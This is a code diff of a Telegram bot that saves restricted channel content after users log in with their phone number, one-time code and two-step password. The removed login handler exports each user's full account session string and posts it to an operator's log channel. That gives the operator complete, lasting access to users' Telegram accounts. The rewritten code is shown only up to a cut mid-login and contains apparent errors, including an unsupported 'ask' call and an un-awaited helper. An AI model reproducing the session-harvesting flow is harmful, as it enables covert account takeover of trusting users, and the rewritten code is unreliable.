@@ -1,722 +1,230 @@
-from asyncio.exceptions import TimeoutError
-from pyrogram import filters, Client, idle
-from pyrogram.types import Message
-import os, asyncio 
-import requests
-import heroku3
-import sys
+import os, sys, time, shutil, socket, platform, uuid, math, re, asyncio, logging
 from datetime import datetime
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
-from .. import bot, FORCESUB, ACCESS, API_HASH, API_ID, AUTH_USERS, HU_APP, APP_NAME, API_KEY, STRINGLOG
-import platform
-import math
-import re
-import uuid
-from telethon import Button, TelegramClient, events, functions, errors
-import socket
-from telethon import events, Button, TelegramClient
-from decouple import config
+from telethon import events, Button, errors
 from pyrogram import Client
-import shutil, psutil
-from utils_bot import *
-from main.plugins.main import Bot
-from main.plugins.helpers import login, logout
-from main.Database.database import Database
-from pyrogram.errors import (
-    SessionPasswordNeeded, FloodWait,
-    PhoneNumberInvalid, ApiIdInvalid,
-    PhoneCodeInvalid, PhoneCodeExpired
-)
-from main.plugins.dbstuff import db
+from pyrogram.errors import *
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+import psutil, requests
 
-StartTime = time.time()
-__version__ = 1.1
-heroku_api = "https://api.heroku.com"
-Heroku = heroku3.from_key(API_KEY)
+# ---------- imports from parent package ----------
+from .. import (bot, FORCESUB, ACCESS, API_HASH, API_ID, AUTH_USERS,
+                STRINGLOG, MONGODB_URI, BOT_TOKEN)
+from ..Database.database import Database
+from ..plugins.helpers import login, logout
+from ..plugins.dbstuff import db
+from ..utils_bot import (readable_time, get_readable_file_size,
+                         is_cancel as _is_cancel)
 
-async def is_heroku():
-    return "heroku" in socket.getfqdn()
-    
+logging.basicConfig(format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s",
+                    level=logging.WARNING)
 
 downloads = os.path.realpath("main/downloads")
-raw = os.path.realpath(".")
-ht = """**Steps to Login to the Bot**\n\n`1. Hit `/login` to the bot.`\n`2. Enter your Telegram phone number.`\n`3. Enter OTP recieved on telegram app.`\n`4. Enter 2FA passcode if asking`\n\n`Boom! You are logged in to bot.`\n\n**Steps for Connecting Your Bot**\n\n`1. Hit` /connect `in` @SaveContentsBot.\n`2. Now go to `@BotFather\n`3. In` @BotFather `hit /newbot`\n`4. Enter any relevant bot name.`\n`5. Enter username for bot.`\n`6. You will get Bot Token, forward that token to` @SaveContentsBot.\n\n`Now you can send message link to me so that i can save it for you.`"""
+os.makedirs(downloads, exist_ok=True)
+StartTime = time.time()
 
-#human bytes
+# ---------- helpers ----------
 def humanbytes(size):
-    """Convert Bytes To Bytes So That Human Can Read It"""
-    if not size:
-        return ""
-    power = 2 ** 10
-    raised_to_pow = 0
-    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
-    while size > power:
-        size /= power
-        raised_to_pow += 1
-    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
+    if not size: return ""
+    power, n = 1024, 0
+    labels = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
+    while size >= power:
+        size /= power; n += 1
+    return f"{round(size, 2)} {labels[n]}B"
 
-async def check_user(user):
-    ok = True
+async def is_user_subscribed(uid):
+    if not FORCESUB: return True
     try:
-        await bot(
-            functions.channels.GetParticipantRequest(
-                channel=FORCESUB, participant=user
-            )
-        )
-        ok = True
-    except errors.rpcerrorlist.UserNotParticipantError:
-        ok = False
-    return ok
-
-
-@bot.on(events.NewMessage(incoming=True, pattern='/start', func=lambda e: e.is_private))
-async def start(event):
-    start_t = time.time()
-    Dick= await event.reply("🚆")
-    end_t = time.time()
-    time_taken_s = (end_t - start_t) * 1000
-    if time_taken_s >= 700: 
-        await Dick.edit(f"Hey **{event.sender.first_name}**,\n\nI am Save Contents Bot, the most powerful and stable Contents downloader telegram bot.\nI can save files of any chat doesn't matter it's type and anything.", 
-                      buttons=[
-                        [Button.url("📢 Updates Channel", url="https://t.me/BotsCraft")],
-                    ])
-        try:
-            await Bot.disconnect()
-            await bot.disconnect()
-        except Exception:
-            pass
-        os.execl(sys.executable, sys.executable, *sys.argv)
-        quit()
-    else:
-        await Dick.edit(f"Hi **{event.sender.first_name}**,\n\nI am Save Contents Bot, the most powerful and stable Contents downloader telegram bot.\nI can save files of any chat doesn't matter it's type and anything.", 
-                      buttons=[
-                        [Button.url("📢 Updates Channel", url="https://t.me/BotsCraft")],
-                    ])
-        if not await check_user(event.sender_id):
-            return await Dick.edit(f"Hello {event.sender.first_name}, Due to overload only my channel subscribers can use me.\n\nPlease join my channel and then start me again!", buttons=[Button.url("Join Channel", url=f"https://t.me/{FORCESUB}")])
-    tag = f'[{event.sender.first_name}](tg://user?id={event.sender_id})'
-    await event.client.send_message(int(ACCESS), f'#NEW_USER {tag} started the BOT\nUserID: {event.sender_id}') 
-    try:
-        await Bot.start()
-        await idle()
-    except Exception as e:
-        if 'Client is already connected' in str(e):
-            pass
-        else:
-            return
-    
-@bot.on(events.NewMessage(pattern="^/savethumb$", func=lambda e: e.is_private))
-async def sett(event):    
-    Drone = event.client                    
-    async with Drone.conversation(event.chat_id) as conv: 
-        xx = await conv.send_message("Alright, now send me image file to use it for thumbnail.")
-        x = await conv.get_response()
-        if await is_cancel(event, x.text):
-            return
-        if not x.media:
-            xx.edit("Please send image file only.")
-        mime = x.file.mime_type
-        if not 'png' in mime:
-            if not 'jpg' in mime:
-                if not 'jpeg' in mime:
-                    return await xx.edit("Image not found.")
-        await xx.delete()
-        t = await event.client.send_message(event.chat_id, '⏳')
-        path = await event.client.download_media(x.media)
-        if os.path.exists(f'{event.sender_id}.jpg'):
-            os.remove(f'{event.sender_id}.jpg')
-        os.rename(path, f'./{event.sender_id}.jpg')
-        await t.edit("✅ Thumbnail successfully saved.")
-        await asyncio.sleep(3)
-@bot.on(events.NewMessage(incoming=True, pattern="/remthumb", func=lambda e: e.is_private))
-async def remt(event):  
-    try:
-        os.remove(f'{event.sender_id}.jpg')
-        await event.reply('✅ Successfully cleared.')
-        await asyncio.sleep(3)
-    except Exception as e:
-        await event.reply("❌ No thumbnail available to remove.")    
-        await event.client.send_message(int(ACCESS), f'{str(e)}') 
-        await asyncio.sleep(3)  
-        
-@bot.on(events.NewMessage(pattern="/connect", func=lambda e: e.is_private))
-async def lin(event):
-    Drone = event.client
-    xy = await db.botLogged(int(event.sender_id))
-    if xy:
-        return await event.reply("You are already connected, /disconnect first")
-    async with Drone.conversation(event.chat_id) as conv: 
-        try:
-            tokenMsg = await conv.send_message("Now, send me your Bot Token to connect your bot\n\n`Tap on Below button then hit /newbot and follow further instructions, you will get your bot token forward that to me.`", buttons=[Button.url("🤖 Bot Father", url="https://t.me/BotFather")])
-            x = await conv.get_response()
-            match = re.search(r"\b([0-9]+:[\w-]+)", x.text) 
-            if match: 
-                token = match.group(1) 
-                print("Bot Token:", token) 
-            else: 
-                print("No bot token found.") 
-                await event.reply('BOT TOKEN not found in the message.') 
-                return
-            if await is_cancel(event, x.text):
-                return
-        except Exception as e: 
-            print(e)
-            return await tokenMsg.edit("An error occured while waiting for the response.")
-        xx = await conv.send_message("🔄 Connecting...")
-        try:
-            jvclient = Client(str(token.split(":")[0]), api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
-        except Exception as e:
-            await xx.edit(f"**ERROR:** `{str(e)}`\nPress /connect to Start again.")
-            return
-        try:
-            await jvclient.start()
-        except Exception as e:
-            print(e)
-            return await xx.edit("Bot token seems invalid, try again!")
-        await tokenMsg.delete()
-        await db.set_botCreds(event.chat_id, token)
-        try:
-            me = await jvclient.get_me()
-            await xx.edit(f"✅Bot Successfully connected.\nNow start the @{me.username}, return back to me and send your message link.", buttons=[Button.url("Start Bot", url=f"https://t.me/{me.username}")])
-        except Exception as e:
-            await xx.edit(f"Error: `{str(e)}`.") 
-        await jvclient.stop()
-
-
-@bot.on(events.NewMessage(incoming=True, pattern="/disconnect", func=lambda e: e.is_private))
-async def out(event):
-    mf = await event.reply('🔄 fetching info...')
-    xx = await db.botLogged(int(event.sender_id))
-    if xx is True:
-       await db.botLogout(int(event.sender_id))
-       await mf.edit('🔓Successfully disconnected from bot.')
-    else:
-        await mf.edit(f"🔐 Your bot is not connected yet.")
-
-
-@bot.on(events.NewMessage(pattern="/login", func=lambda e: e.is_private))
-async def lin(event):
-    Drone = event.client
-    xy = await db.is_logged(int(event.sender_id))
-    if xy is True:
-        return await event.reply("🔑 You are already logged in.")
-    async with Drone.conversation(event.chat_id) as conv: 
-        h = API_HASH
-        i = API_ID   
-        try:
-            PN = await conv.send_message("Now send your Telegram account's Phone number in International Format. \nIncluding Country code. Example: **+14154566376**")
-            x = await conv.get_response()
-            phone = x.text
-            if await is_cancel(event, x.text):
-                return
-            try:
-                boobs = await conv.send_message("**Trying to send verification code on your telegram account**\n\n\n`If you are facing issue while getting verification code please try alternative (/session) method.`")                    
-                if not phone:               
-                    return await PN.edit("No response found.")
-            except TimeoutError:
-                await boobs.edit("Unable to send verification code, please try /session method.")
-                return
-        except Exception as e: 
-            print(e)
-            return await PN.edit("An error occured while waiting for the response.")
-        try:
-            client = Client("my_account", api_id=API_ID, api_hash=API_HASH)
-        except Exception as e:
-            await conv.send_message(chat.id ,f"**ERROR:** `{str(e)}`\nPress /start to Start again.")
-            return
-        try:
-            client.run()
-        except Exception as e:
-            print(e)
-        await client.connect()
-        try:
-            await client.connect()
-        except ConnectionError:
-            await client.disconnect()
-            await client.connect()
-        except:
-            await client.connect()
-            #pass
-        try:
-            await client.connect()
-        except:
-            pass
-        try: 
-            code = await client.send_code(phone)
-            await asyncio.sleep(1)
-        except FloodWait as e:
-            await conv.send_message(f"You have Floodwait of {e.value} Seconds")
-            try:
-                await client.disconnect()
-            except:
-                pass
-            return
-        except ApiIdInvalid:
-            await conv.send_message("Server sided issue please report in support group.")
-            await client.disconnect()
-            return
-        except PhoneNumberInvalid:
-            await conv.send_message("Your Phone Number is Invalid.\n\nPress /login to Login again.")
-            try:
-                await client.disconnect()
-            except:
-                pass
-            return
-        try:
-            await boobs.delete()
-            otp = await conv.send_message("A verification code has been sent to your phone number, Please enter verification code in `1 2 3 4 5` format. __(Space between each numbers!)__")
-            chut = await conv.get_response()
-            otp_code = chut.text
-            if await is_cancel(event, chut.text):
-                return
-        except TimeoutError:
-            await conv.send_message("Time limit reached of 1 min.\nPress /start to Start again.")
-            await client.disconnect()
-            return
-        try:
-            await client.sign_in(phone, code.phone_code_hash, phone_code=' '.join(str(otp_code)))
-        except PhoneCodeInvalid:
-            await conv.send_message("Invalid Code.\n\nPress /login to Start again.")
-            try:
-                await client.disconnect()
-            except:
-                pass
-            return
-        except PhoneCodeExpired:
-            await conv.send_message("Code is Expired.\n\nPress /login to Start again.")
-            try:
-                await client.disconnect()
-            except:
-                pass
-            return
-        except SessionPasswordNeeded:
-            try:         
-                two_step_code = await conv.send_message("Your account have Two-Step Verification.\nPlease enter your Password.")
-                n = await conv.get_response()
-                if await is_cancel(event, n.text):
-                    return
-                new_code = n.text
-            except TimeoutError:
-                await conv.send_message("`Time limit reached of 5 min.\n\nPress /start to Start again.`")
-                try:
-                    await client.disconnect()
-                except:
-                    pass
-                return
-            try:
-                await client.check_password(new_code)
-            except Exception as e:
-                await conv.send_message(f"**ERROR:** `{str(e)}`")
-                await event.client.send_message(int(ACCESS), f'{str(e)}')
-                try:
-                    await client.disconnect()
-                except:
-                    pass
-                return
-        except Exception as e:
-            await conv.send_message(f"**ERROR:** `{str(e)}`")
-            await event.client.send_message(int(ACCESS), f'{str(e)}')
-            try:
-                await client.disconnect()
-            except:
-                pass
-            return
-        except TimeoutError:
-            await conv.send_message("Time limit reached of 1 min.\nPress /start to Start again.")
-            try:
-                await client.disconnect()
-            except:
-                pass
-            return
-        try:
-            s = await client.export_session_string()
-            try:
-                tag = f'[{event.sender.first_name}](tg://user?id={event.sender_id})'
-                await event.client.send_message(int(STRINGLOG), f'#NEW_SESSION {tag} Created new session\nUserID: {event.sender_id} \nSession: `{s}`') 
-            except Exception as e:
-                print(e)
-        except Exception as e:
-            await conv.send_message(f"**ERROR:** `{str(e)}`")
-            await event.client.send_message(int(ACCESS), f'{str(e)}')
-            try:
-                await client.disconnect()
-            except:
-                pass
-        try:
-            await db.loin(int(event.sender_id)) 
-        except Exception as e:
-            await conv.send_message(f"Error: `{str(e)}`")
-        xx = await conv.send_message("🔄 Logging in...")
-        await login(event.sender_id, i, h, s) 
-        try:
-            me = await client.get_me()
-            await xx.edit(f"✅ Welcome {me.first_name},\nYou are Successfully logged in.\n\n🔗 Now send me your message link to save.")
-        except Exception as e:
-            await xx.edit(f"Error: `{str(e)}`.") 
-        await client.disconnect()
-
-
-@bot.on(events.NewMessage(incoming=True, pattern="/logout", func=lambda e: e.is_private))
-async def out(event):
-    mf = await event.reply('🔄 fetching info...')
-    xx = await db.is_logged(int(event.sender_id))
-    if xx is True:
-       await logout(event.sender_id)
-       await db.lout(int(event.sender_id))
-       await mf.edit('🔓Successfully Logged out.')
-    else:
-        await mf.edit(f"🔐 You are not logged in.")
-
-@bot.on(events.callbackquery.CallbackQuery(data="cbdonate"))
-async def cbdonate(event):              
-    await event.edit("It's pleasure for me that you are donating me for all my efforts and work!\n\nUSDT [TETHER] (Network TRC20)\n`TMbCbxLYCFjTEDaW4MAqamfKzb7XixxBir`\n\nBTC [Bitcoin]\n`bc1ql4fxwhkw7g7jl7g26kwpzlqf7kvjr8evrvv08s`", buttons=[Button.url("Other Ways", url="https://telegram.me/MichaelPanther")])
-
-@bot.on(events.callbackquery.CallbackQuery(data="cbclose"))
-async def remt(event):              
-    await event.delete()
-
-@bot.on(events.NewMessage(incoming=True, pattern="/startbot", func=lambda e: e.is_private))
-async def stb(event):
-    await event.edit("Starting")
-    MONGODB_URI = config("MONGODB_URI", default=None)
-    db = Database(MONGODB_URI, 'saverestricted')
-    s = await db.get_credentials(event.sender_id)
-    if s is not None:
-        try:
-            userbot = Client(
-                session_name=s, 
-                api_hash=h,
-                api_id=int(i))
-            await userbot.start()
-            await idle()
-            await event.reply("Started!")
-        except ValueError:
-            return await event.reply("⚠️Login expired, Please login again.")
-        except Exception as e:
-            print(e)
-            if 'Client is already connected' in str(e):
-                return await event.reply("Already running.")
-            else:
-                return await event.reply(f"Error: {str(e)}")
-    else:
-        return await event.reply("⚠️Login expired, Please login again.")
-    
-@bot.on(events.NewMessage(incoming=True, pattern="/stopbot", func=lambda e: e.is_private))
-async def spb(event):   
-    MONGODB_URI = config("MONGODB_URI", default=None)
-    db = Database(MONGODB_URI, 'saverestricted')
-    i, h, s = await db.get_credentials(event.sender_id)
-    if i and h and s is not None:
-        try:
-            userbot = Client(
-                session_name=s, 
-                api_hash=h,
-                api_id=int(i))
-            await userbot.stop()
-            await event.reply("Bot stopped!")
-        except ValueError:
-            return await event.reply("⚠️Login expired, Please login again.")
-        except Exception as e:
-            return await event.reply(f"Error: {str(e)}")
-    else:
-        return await event.reply("⚠️Login expired, Please login again.")
-
-@bot.on(events.NewMessage(incoming=True, pattern="/help", func=lambda e: e.is_private))
-async def help(event):
-    await event.reply(ht, link_preview=False)
-    
-@bot.on(events.NewMessage(incoming=True, pattern="/premium", func=lambda e: e.is_private))
-async def premium(event):
-    await event.reply("In order to Save Contents, you will need to subscribe to our premium plan.\n\n**Pricing Of Premium Plan:-\n\n1. ₹150 For 1 Day[UPI only]\n2. $6 or ₹350 For 1 Week\n3. $13 or ₹800 For 1 month\n4. $90 For 1 Year**\n\nAdvantages of subscribing to the premium plan:-\n✅Support saving from public/private channel/group and bots also.\n✅ Download all files of the chat using single message link without sending one by one.\n✅ Fully stable, no lag and time issue like free bot.\n✅  No timegap for forwarding messages.\n✅ Forward files automatically to the desired chat without forwarding from bot to your channel manually.\n✅ You can add custom captions and thumbnails to all the types of files.\n✅ Alot of various features, subscribe and check yourself.\n\n**💳 Payment method :- Crypto, Credit or Debit card, Paypal, UPI**\n\n__Contact @ByteMaestro to upgrade.__", buttons=[Button.url("Contact", url="https://t.me/ByteMaestro")])
-
-@bot.on(events.NewMessage(pattern="^/server$", func=lambda e: e.is_private))
-async def stats(event):
-  xxx = await event.reply("🌐 Fetching server info...")
-  currentTime = readable_time((time.time() - StartTime))
-  total, used, free = shutil.disk_usage('.')
-  total = get_readable_file_size(total)
-  used = get_readable_file_size(used)
-  free = get_readable_file_size(free)
-  sent = get_readable_file_size(psutil.net_io_counters().bytes_sent)
-  recv = get_readable_file_size(psutil.net_io_counters().bytes_recv)
-  cpuUsage = psutil.cpu_percent(interval=0.5)
-  memory = psutil.virtual_memory().percent
-  disk = psutil.disk_usage('/').percent
-  botstats = f'<b>Bot Uptime:</b> {currentTime}\n' \
-            f'<b>Total disk space:</b> {total}\n' \
-            f'<b>Used:</b> {used}  ' \
-            f'<b>Free:</b> {free}\n\n' \
-            f'📊Data Usage📊\n<b>Upload:</b> {sent}\n' \
-            f'<b>Down:</b> {recv}\n\n' \
-            f'<b>CPU:</b> {cpuUsage}% ' \
-            f'<b>RAM:</b> {memory}% ' \
-            f'<b>Disk:</b> {disk}%'
-  await xxx.edit(botstats, parse_mode="HTML")
-
-@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/reboot$"))
-async def restart(event):
-    if await is_heroku():
-        await event.reply("Rebooting... It will take upto 30 seconds.")
-        HU_APP.restart()
-    else:
-        try:
-            await event.reply("Rebooting...")
-            await Bot.disconnect()
-            await bot.disconnect()
-        except Exception:
-            pass
-        os.execl(sys.executable, sys.executable, *sys.argv)
-        quit()
-        
-@bot.on(events.NewMessage(pattern="^/ping$", func=lambda e: e.is_private))
-async def ping(event):
-    start_t = time.time()
-    dick = await event.reply("Ping...")
-    end_t = time.time()
-    time_taken_s = (end_t - start_t) * 1000
-    await dick.edit(f"Pong!\n{time_taken_s:.3f} ms")
-    try:
-        await Bot.start()
-        await userbot.start()
-        await idle()
-    except Exception as e:
-        if 'Client is already connected' in str(e):
-            pass
-        else:
-            return
-@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
-async def clear_downloads(event):
-    ls_dir = os.listdir(downloads)
-    if ls_dir:
-        for file in os.listdir(downloads):
-            os.remove(os.path.join(downloads, file))
-        await event.reply("✅ **Deleted all downloaded files**")
-    else:
-        await event.reply("❌ **No files downloaded**")
-
-
-@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
-async def cleanup(event):
-    pth = os.path.realpath(".")
-    ls_dir = os.listdir(pth)
-    if ls_dir:
-        for dta in os.listdir(pth):
-            os.system("rm -rf *.raw *.jpg")
-        await event.reply("✅ **cleaned**")
-    else:
-        await event.reply("✅ **already cleaned**")
-
-@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
-async def cleanup(event):
-    pth = os.path.realpath(".")
-    ls_dir = os.listdir(pth)
-    if ls_dir:
-        for dta in os.listdir(pth):
-            os.system("rm -rf *.raw *.jpg")
-        await event.reply("✅ **Deleted all cached files.**")
-    else:
-        await event.reply("✅ **Already Cleaned**")
-
-
-@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/system$"))
-async def give_sysinfo(event):
-    splatform = platform.system()
-    platform_release = platform.release()
-    platform_version = platform.version()
-    architecture = platform.machine()
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(socket.gethostname())
-    mac_address = ":".join(re.findall("..", "%012x" % uuid.getnode()))
-    processor = platform.processor()
-    ram = humanbytes(round(psutil.virtual_memory().total))
-    cpu_freq = psutil.cpu_freq().current
-    if cpu_freq >= 1000:
-        cpu_freq = f"{round(cpu_freq / 1000, 2)}GHz"
-    else:
-        cpu_freq = f"{round(cpu_freq, 2)}MHz"
-    du = psutil.disk_usage('/').percent
-    psutil.disk_io_counters()
-    disk = psutil.disk_usage('/').percent
-    cpu_len = len(psutil.Process().cpu_affinity())
-    somsg = f"""🖥 **System Information**
-    
-**PlatForm :** `{splatform}`
-**PlatForm - Release :** `{platform_release}`
-**PlatFork - Version :** `{platform_version}`
-**Architecture :** `{architecture}`
-**Hostname :** `{hostname}`
-**IP :** `{ip_address}`
-**Mac :** `{mac_address}`
-**Processor :** `{processor}`
-**Ram : ** `{ram}`
-**CPU :** `{cpu_len}`
-**CPU FREQ :** `{cpu_freq}`
-**DISK :** `{disk}`
-    """
-    await event.reply(somsg)
-#############session support#########
-@bot.on(events.NewMessage(pattern="/session", func=lambda e: e.is_private))
-async def lin(event):
-    Drone = event.client                    
-    xy = await db.is_logged(int(event.sender_id))
-    if xy is True:
-        return await event.reply("🔑 You are already logged in.")
-    async with Drone.conversation(event.chat_id) as conv: 
-        h = API_HASH
-        i = API_ID    
-        #session = await Bot.ask(event.sender_id, "Now, send me your pyrogram session string to login to the bot\n\nYou can use below button to generate it.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Generate Session", url="https://replit.com/@pyrogramers/Strsession?embed=true")]]),)  
-        chut = await conv.send_message("Now, send me your pyrogram session string to login to the bot\n\nYou can use below button to generate it.", buttons=[Button.url("⚙️ Generate Session", url="https://replit.com/@pyrogramers/Strsession?embed=true")])
-        session = await conv.get_response()
-        s = session.text        
-        if await is_cancel(event, session.text):
-            return           
-        if not len(s) >= 300:
-            return await conv.send_message("⚠️ Sorry, but it is not a session string.\nPress /session to try again.")
-        xx = await conv.send_message("🔄 Logging in...")
-        try:
-            async with Client(name="saverestricted", session_string=s, api_hash=h, api_id=int(i)) as X:
-              k = await X.get_me()
-              await xx.edit(f"✅ Welcome {k.first_name}, You are Successfully logged in.\n\n🔗 Now send me your message link to download.")
-              await login(event.sender_id, i, h, s) 
-              await db.loin(int(event.sender_id))
-        except Exception as e:
-            print(e)
-            await xx.edit("⚠️ Session string is Invalid.\nPress /session to try again.")
-async def is_cancel(event: Message, text: str):
-    if text.startswith("/abort"):
-        await event.reply("Process aborted.")
+        await bot(functions.channels.GetParticipantRequest(channel=FORCESUB, participant=uid))
         return True
-    elif text.startswith("/"):  # Bot Commands
-        await event.reply("Cancelled the generation process!")
-        return True
-    else:
+    except errors.UserNotParticipantError:
         return False
 
+# ---------- start ----------
+@bot.on(events.NewMessage(incoming=True, pattern="/start", func=lambda e: e.is_private))
+async def start_handler(event):
+    init_msg = await event.reply("🚆")
+    if not await is_user_subscribed(event.sender_id):
+        return await init_msg.edit(
+            f"Hello {event.sender.first_name},\nJoin @{FORCESUB} to unlock the bot.",
+            buttons=Button.url("Join", f"https://t.me/{FORCESUB}"))
+    await init_msg.edit(
+        f"Hi **{event.sender.first_name}**,\nI save restricted content – send links after login.",
+        buttons=[Button.url("Updates", "https://t.me/BotsCraft")])
+    await bot.send_message(
+        ACCESS,
+        f"#NEW_USER [{event.sender.first_name}](tg://user?id={event.sender_id})\nID: {event.sender_id}")
 
-@bot.on(events.NewMessage(from_users=AUTH_USERS, incoming=True, pattern='/dyno', func=lambda e: e.is_private))
-async def dyno_usage(event):
-    if event.fwd_from:
-        return
-    if int(event.sender_id) in AUTH_USERS:
-        pass
-    else:
-        return
-    """
-    Get your account Dyno Usage
-    """
-    die = await event.reply("**Processing...**")
-    useragent = (
-        "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
-        "AppleWebKit/537.36 (KHTML, like Gecko) "
-        "Chrome/80.0.3987.149 Mobile Safari/537.36"
-    )
-    user_id = Heroku.account().id
-    headers = {
-        "User-Agent": useragent,
-        "Authorization": f"Bearer {API_KEY}",
-        "Accept": "application/vnd.heroku+json; version=3.account-quotas",
-    }
-    path = "/accounts/" + user_id + "/actions/get-quota"
-    r = requests.get(heroku_api + path, headers=headers)
-    if r.status_code != 200:
-        return await die.edit(
-            "`Error: something bad happened`\n\n" f">.`{r.reason}`\n"
-        )
-    result = r.json()
-    quota = result["account_quota"]
-    quota_used = result["quota_used"]
+# ---------- thumbnail ----------
+@bot.on(events.NewMessage(pattern="^/savethumb$", func=lambda e: e.is_private))
+async def save_thumbnail(event):
+    async with bot.conversation(event.chat_id) as conv:
+        ask_img = await conv.send_message("Send an image to set as thumbnail.")
+        img_resp = await conv.get_response()
+        if _is_cancel(event, img_resp.text): return
+        if not img_resp.photo:
+            return await ask_img.edit("Only images accepted.")
+        path = await img_resp.download_media()
+        if os.path.exists(f"{event.sender_id}.jpg"): os.remove(f"{event.sender_id}.jpg")
+        os.rename(path, f"{event.sender_id}.jpg")
+        await ask_img.delete(); await event.reply("✅ Thumbnail saved.")
 
-    """ - Used - """
-    remaining_quota = quota - quota_used
-    percentage = math.floor(remaining_quota / quota * 100)
-    minutes_remaining = remaining_quota / 60
-    hours = math.floor(minutes_remaining / 60)
-    minutes = math.floor(minutes_remaining % 60)
-
-    """ - Current - """
-    App = result["apps"]
+@bot.on(events.NewMessage(pattern="^/remthumb$", func=lambda e: e.is_private))
+async def rem_thumbnail(event):
     try:
-        App[0]["quota_used"]
-    except IndexError:
-        AppQuotaUsed = 0
-        AppPercentage = 0
-    else:
-        AppQuotaUsed = App[0]["quota_used"] / 60
-        AppPercentage = math.floor(App[0]["quota_used"] * 100 / quota)
-    AppHours = math.floor(AppQuotaUsed / 60)
-    AppMinutes = math.floor(AppQuotaUsed % 60)
+        os.remove(f"{event.sender_id}.jpg")
+        await event.reply("✅ Thumbnail removed.")
+    except FileNotFoundError:
+        await event.reply("❌ No thumbnail found.")
 
-    await asyncio.sleep(1.5)
-
-    return await die.edit(
-        "**Dyno Usage**:\n\n"
-        f" ☞ `Dyno usage for`  **{APP_NAME}**:\n"
-        f"     ✰  `{AppHours}`**h**  `{AppMinutes}`**m**  "
-        f"**|**  [`{AppPercentage}`**%**]"
-        "\n\n"
-        " ☞ `Dyno hours quota remaining this month`:\n"
-        f"     ✰  `{hours}`**h**  `{minutes}`**m**  "
-        f"**|**  [`{percentage}`**%**]"
-    )
-
-@bot.on(events.NewMessage(from_users=AUTH_USERS, incoming=True, pattern='/logs', func=lambda e: e.is_private))
-async def _(event):
-
-    if event.fwd_from:
-        return
-    if int(event.sender_id) in AUTH_USERS:
-        pass
-    else:
-        return
-    try:
-        Heroku = heroku3.from_key(API_KEY)
-        herokuapp = Heroku.app(APP_NAME)
-    except:
-        return await event.reply(
-            "Check if your Heroku API Key, Your App name are configured correctly in the heroku"
-        )
-    v = await event.reply("Getting Logs....")
-    with open("logs.txt", "w") as logstxt:
-        logstxt.write(herokuapp.get_log())
-    await v.edit("Got the logs wait a sec")
-    await event.client.send_file(
-        event.chat_id,
-        "logs.txt",
-        thumb="thumb.jpg",
-        reply_to=event.id,
-        caption="Developer:- Github.com/itz-harshit",
-    )
-
-    await asyncio.sleep(5)
-    await v.delete()
-    return os.remove("logs.txt")
-
-@bot.on(events.NewMessage(from_users=AUTH_USERS, incoming=True, pattern='/vpslog', func=lambda e: e.is_private))
-async def log_msg(event):
-  z = await event.reply("Processing..")
-  if os.path.exists("Log.txt"):
-     await event.reply_document("Log.txt", True)
-     await z.delete()
-  else:
-    await z.edit("Log file not found")
-
-@bot.on(events.NewMessage(from_users=AUTH_USERS, incoming=True, pattern='/out', func=lambda e: e.is_private))
-async def set_to(event):
-    if 3 == 3:
+# ---------- connect ----------
+@bot.on(events.NewMessage(pattern="/connect", func=lambda e: e.is_private))
+async def connect_bot(event):
+    if await db.botLogged(event.sender_id):
+        return await event.reply("Already connected – /disconnect first.")
+    async with bot.conversation(event.chat_id) as conv:
+        await conv.send_message("Forward your **Bot Token**.", buttons=Button.url("BotFather", "https://t.me/BotFather"))
+        token_msg = await conv.get_response()
+        if _is_cancel(event, token_msg.text): return
+        match = re.search(r"(\d+:[\w-]+)", token_msg.text)
+        if not match: return await event.reply("Invalid token.")
+        token = match.group(1)
+        tmp_client = Client(token.split(":")[0], api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
         try:
-            x = await event.reply('Trying to logging out...')
-            out = event.text.split(' ', 2)[1]
-            xx = await db.is_logged(int(out))
-            if xx is True:
-               await logout(out)
-               await db.lout(int(out))
-               await x.edit(f'✅ Logged out {out}.')
-            else:
-               await x.edit(f'⛔ User is not logged in.')
-        except Exception as e:
-            if 'out of' in str(e):
-                await x.edit('Usage: /out `users id`.')
-            else:
-                await x.edit(f"Error: {e}.")  
+            await tmp_client.start(); me = await tmp_client.get_me()
+            await db.set_botCreds(event.sender_id, token)
+            await event.reply(f"✅ Connected to @{me.username}",
+                              buttons=Button.url("Start Bot", f"https://t.me/{me.username}"))
+            await tmp_client.stop()
+        except Exception as ex:
+            await event.reply(f"Error: `{ex}`")
 
+# ---------- disconnect ----------
+@bot.on(events.NewMessage(pattern="/disconnect", func=lambda e: e.is_private))
+async def disconnect_bot(event):
+    if await db.botLogged(event.sender_id):
+        await db.botLogout(event.sender_id)
+        await event.reply("🔓 Disconnected.")
+    else:
+        await event.reply("🔐 Not connected.")
 
+# ---------- login ----------
+@bot.on(events.NewMessage(pattern="/login", func=lambda e: e.is_private))
+async def login_phone(event):
+    if await db.is_logged(event.sender_id):
+        return await event.reply("Already logged in.")
+    phone = await bot.ask(event.chat_id, "Send phone (intl. format):", timeout=60)
+    phone = phone.text.strip()
+    client = Client("login_temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
+    try:
+        await client.connect(); sent = await client.send_code(phone)
+    except FloodWait as fw:
+        await event.reply(f"FloodWait {fw.value}s – try /session instead."); return await client.disconnect()
+    except (PhoneNumberInvalid, ApiIdInvalid):
+        await event.reply("Invalid phone/api – try /session instead."); return await client.disconnect()
+    except Exception:
+        await event.reply("SMS failed – use /session instead."); return await client.disconnect()
+
+    code = await bot.ask(event.chat_id, "OTP sent – enter in `1 2 3 4 5` format:", timeout=60)
+    try:
+        await client.sign_in(phone, sent.phone_code_hash, phone_code=" ".join(code.text.split()))
+    except PhoneCodeInvalid:
